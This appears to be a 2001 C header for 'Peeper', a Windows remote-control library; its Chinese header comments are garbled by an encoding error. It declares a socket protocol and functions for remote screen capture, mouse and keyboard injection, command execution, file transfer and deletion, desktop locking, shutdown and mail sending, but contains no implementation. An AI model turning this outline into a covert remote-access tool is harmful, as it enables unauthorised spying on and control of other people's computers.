///////////////////////////////////////////////////////////////////////////////
// Զ�̿�������-͵����  ������                                               //
// ����:2001/10/02                                                           //
// ����:������                                                               //
// Email:dongfa@yeah.net                                                     //
// http://dongfa.yeah.net                                                    //
// OICQ:5584173  ����                                                        //
// ��������:                                                                 //
//     �˲��ִ���ȫ��������д��������㴫������Ҫ�����ļ���������,������     //
// �������������,лл!                                                      //
///////////////////////////////////////////////////////////////////////////////

#ifndef __PEEPER_LIB_H__
#define __PEEPER_LIB_H__

#ifdef __cplusplus
extern "C"
{
#endif

DECLARE_HANDLE(HDIB);

#define DISP_SOCKET_ERROR     {\
			LPVOID lpMsgBuf = NULL;\
			::FormatMessage\
			( \
				FORMAT_MESSAGE_ALLOCATE_BUFFER | \
				FORMAT_MESSAGE_FROM_SYSTEM | \
				FORMAT_MESSAGE_IGNORE_INSERTS,\
				NULL,\
				::WSAGetLastError(),\
				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\
				(LPTSTR) &lpMsgBuf,\
				0,\
				NULL \
			);\
			::MessageBox(NULL, (LPCTSTR)lpMsgBuf, "Error", \
				MB_OK | MB_ICONINFORMATION);\
			LocalFree(lpMsgBuf);\
						}\
 



#define PALVERSION             0x300
#define WIDTHBYTES(bits)       (((bits) + 31) / 32 * 4)
#define IS_WIN30_DIB(lpbi)     ((*(LPDWORD)(lpbi)) == sizeof(BITMAPINFOHEADER))
#define RECTWIDTH(lpRect)      ((lpRect)->right - (lpRect)->left)
#define RECTHEIGHT(lpRect)     ((lpRect)->bottom - (lpRect)->top)


#define PL_PEEPER_PORT			5180
// SOCKET buffer max length
#define PL_SOCKET_MAXBYTES		1024

// GET dib message
#define PL_GET_DIB_MESSAGE			WM_USER + 0x01

// CONNECT server message
#define PL_CONNECT_MESSAGE			WM_USER + 0x02

// PEEPER notify message
#define PL_PEEPER_NOTIFY			WM_USER + 0x0A

#define PL_PEEPER_NOTIFY_CLOSE		WM_USER + 0xA1
#define PL_PEEPER_NOTIFY_CONNECT	WM_USER + 0xA2
#define PL_PEEPER_NOTIFY_DISCONNECT	WM_USER + 0xA3

// copy file notify message
// wParam = X% 0~100
#define PL_PEEPER_NOTIFY_COPYFILE   WM_USER + 0xA4

//define peeper server version
#define PEEPER_SERVER_VER_10		("Ver 1.0")
#define PEEPER_SERVER_VER_12		("Ver 1.2")
#define PEEPER_SERVER_VER_15		("Ver 1.5")
#define PEEPER_SERVER_VER_20		("Ver 2.0")
#define PEEPER_SERVER_VER_25		("Ver 2.5")
#define PEEPER_SERVER_VER_30		("Ver 3.0")

// UPDATE desktop timer
#define PL_DIB_TIMER			200
#define PL_DIB_TIMERID			50
#define PL_SOCKET_RETRYTIME		4000

// DEFINE enable/disable event
#define PL_ENABLE_NONE			0x00000000

#define PL_ENABLE_MOUSE_MOVE	0x00000001
#define PL_ENABLE_MOUSE_LBUTTON	0x00000002
#define PL_ENABLE_MOUSE_RBUTTON	0x00000004
#define PL_ENABLE_MOUSE_LDBLCLK	0x00000008
#define PL_ENABLE_MOUSE_RDBLCLK	0x00000010

#define PL_ENABLE_KEY			0x00000020
#define PL_ENABLE_DIB			0x00000040

#define PL_ENABLE_ALL			0xFFFFFFFF

// CLOSE server
#define PL_CLOSE_PEEPER			0xDF

// NONE define
#define PL_NONE					0x00

//get server version
#define PL_PEEPER_VER			0x01
        //server:Flag+(char*)
        //client:Flag

// TEMP define
#define PL_TEMP					0x03

// RETURN BOOL result 
#define PL_RETURN_BOOL			0x04
        //Flag+(BOOL)

// CLIENT close
#define PL_CLIENT_CLOSE			0x05
        //Flag

// MESSAGE define
#define PL_MSG					0x08
        //Flag+(char*)

// SCREEN size
#define PL_SCREEN_SIZE			0x09
        //Flag+(int)(x)+(int)(y)

// DIB define
#define PL_DIB					0x11
        //Server:Flag+(PL_ColorType)+(PL_ZipType)
        //Client:Flag+(int)(nSize)

// DIB zip and unzip
#define PL_DIB_BITS				0x12
        //Flag+(int)(nBits)

// MOUSE define
#define PL_MOUSE_MOVE			0x21
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_LBUTTONDOWN	0x22
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_LBUTTONUP		0x23
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_RBUTTONDOWN	0x24
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_RBUTTONUP		0x25
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_LDBLCLK		0x26
        //Flag+(int)(x)+(int)(y)

#define PL_MOUSE_RDBLCLK		0x27
        //Flag+(int)(x)+(int)(y)

// KEYBOARD define
#define PL_KEY_DOWN				0x31
        //Flag+(UINT)(VK)+(UINT)(nFlag)

#define PL_KEY_UP				0x32
        //Flag+(UINT)(VK)+(UINT)(nFlag)

// OTHER function
// EXECUTE command line
#define PL_FUNC_EXEC			0x81
        //Flag+(char *)

// LOCK and UNLOCK desktop
#define PL_FUNC_LOCK			0x82
        //Flag+(BOOL)  

// EXIT window
#define PL_FUNC_EXITWIN			0x83
        //Flag+(UINT)

// SEND Ctrl+Alt+Del
#define PL_FUNC_CTRL_ALT_DEL	0x84
        //Flag

// COPY a local file to remote computer
#define PL_FUNC_FILE_COPY_S		0x85
        //Flag+(char*)

// COPY a remote file to client computer
#define PL_FUNC_FILE_COPY_C		0x86
        //Flag+(char*)

// DELETE a remote file
#define PL_FUNC_FILE_DELETE		0x87
        //Flag+(char*)

// RENAME a remote file
#define PL_FUNC_FILE_MOVE		0x88
        //Flag+(char*)

// DEFINE color bits
enum PL_ColorType{color_1 = 0, color_4, color_8, color_24, color_max};
// DEFINE zip type
enum PL_ZipType{zip_none = 0, zip_lz77, zip_lzw, zip_jpeg, zip_lzss, zip_ari, zip_max};

// Socket Tools
// init socket
BOOL    WINAPI PL_InitSocket();
// cleanup socket
BOOL    WINAPI PL_TermSocket();
// SEND socket data
int     WINAPI PL_SendSocketData(SOCKET s, BYTE *chData, int nLen, 
								 BYTE chFlag = PL_NONE, UINT uFlag = 0);
// RECEIVE socket data
int     WINAPI PL_ReadSocketData(SOCKET s, BYTE *chData, int nLen, 
								 BYTE *chFlag = NULL, UINT uFlag = 0);

// Compress and Decompress
// LZ77 
HGLOBAL WINAPI PL_LZ77_Zip(HGLOBAL hUnZip);
HGLOBAL WINAPI PL_LZ77_UnZip(HGLOBAL hZip);

// LZSS
HGLOBAL WINAPI PL_LZSS_Zip(HGLOBAL hUnZip);
HGLOBAL WINAPI PL_LZSS_UnZip(HGLOBAL hZip);

// ARI
HGLOBAL WINAPI PL_ARI_Zip(HGLOBAL hUnZip);
HGLOBAL WINAPI PL_ARI_UnZip(HGLOBAL hZip);

// LZW
HGLOBAL WINAPI PL_LZW_Zip(HGLOBAL hUnZip);
HGLOBAL WINAPI PL_LZW_UnZip(HGLOBAL hZip);

// Dib & Bitmap Function
HBITMAP WINAPI PL_GetBitmap(HWND hWnd);
BOOL    WINAPI PL_Bmp2Gry(HBITMAP hBmp, LPBYTE *lpGryData, SIZE *szGrySize);
BOOL    WINAPI PL_DrawGry(HDC hDC, LPBYTE lpGryData, SIZE szGrySize);
int     WINAPI PL_ColorsNum(LPBYTE lpbi);
int     WINAPI PL_PaletteSize(LPBYTE lpbi);
LPBYTE  WINAPI PL_DIBBits(LPBYTE lpbi);
int     WINAPI PL_DIBWidth(LPBYTE lpDIB);
int     WINAPI PL_DIBHeight(LPBYTE lpDIB);
HDIB    WINAPI PL_BmpToDIB(HBITMAP hBitmap, HPALETTE hPal, int nBits = -1);
BOOL    WINAPI PL_CreateDIBPalette(HDIB hDIB, CPalette* pPal);
BOOL    WINAPI PL_DrawDIB(HDC hDC, LPRECT lpDCRect, HDIB hDIB, LPRECT lpDIBRect, CPalette* pPal);
BOOL    WINAPI PL_DrawBmp(HDC hDC, LPRECT lpDCRect, HBITMAP hBmp, LPRECT lpBmpRect, CPalette* pPal);

// Mouse Control Function
SIZE    WINAPI PL_GetScreenSize();
void    WINAPI PL_MouseMove(POINT point);
void    WINAPI PL_MouseLButtonDown(POINT point, BOOL bMove = FALSE);
void    WINAPI PL_MouseLButtonUp(POINT point, BOOL bMove = FALSE);
void    WINAPI PL_MouseRButtonDown(POINT point, BOOL bMove = FALSE);
void    WINAPI PL_MouseRButtonUp(POINT point, BOOL bMove = FALSE);
void    WINAPI PL_MouseLButtonDblClk(POINT point, BOOL bMove = FALSE);
void    WINAPI PL_MouseRButtonDblClk(POINT point, BOOL bMove = FALSE);

// Keyboard Control Function
void    WINAPI PL_KeyDown(UINT uChar, UINT uFlag);
void    WINAPI PL_KeyUp(UINT uChar, UINT uFlag);

// Other/Tools function
BOOL    WINAPI PL_GetHostName(char *chIP, char *chName = NULL);
int     WINAPI PL_ExecuteCommand(char *chCommandLine);
void    WINAPI PL_LockDesktop(BOOL bLock = TRUE);
BOOL    WINAPI PL_ExitWindow(UINT uFlag);
void    WINAPI PL_Send_CtrlAltDel();// δ��ʵ��
BOOL    WINAPI PL_CopyFileClient(CString strIP, UINT uPort, char *chSrc, 
								 BOOL bSend = TRUE, HWND hNotifyWnd = NULL);
BOOL    WINAPI PL_CopyFileServer(UINT uPort, char *chDes, BOOL bSend = FALSE, 
								 HWND hNotifyWnd = NULL);
BOOL    WINAPI PL_DeleteFile(char *chFileName);
BOOL    WINAPI PL_MoveFile(char *chSrcFileName, char *chDesFileName);

// Send Mail function
// USE SMTP protocol
BOOL    WINAPI PL_SendMail(CString strSMTP, CString strFrom, 
						   CString strTo, CString strSubject, CString strBody);

// USE ESMTP protocol
BOOL    WINAPI PL_SendMail2(CString strSMTP, CString strFrom, 
								 CString strAuth, CString strPass,
								 CString strTo, CString strSubject, 
								 CString strBody);
//Detect Internet connect
BOOL    WINAPI PL_DetectInternetConnect(CString strHTTP = _T("http://www.163.com"));

//Read data from a file
HGLOBAL WINAPI PL_ReadDataFromFile(CString strFile);

//Write data to a file
BOOL    WINAPI PL_WriteDataToFile(CString strFile, HGLOBAL hData);

#ifdef __cplusplus
}
#endif
#endif //__PEEPER_LIB_H__
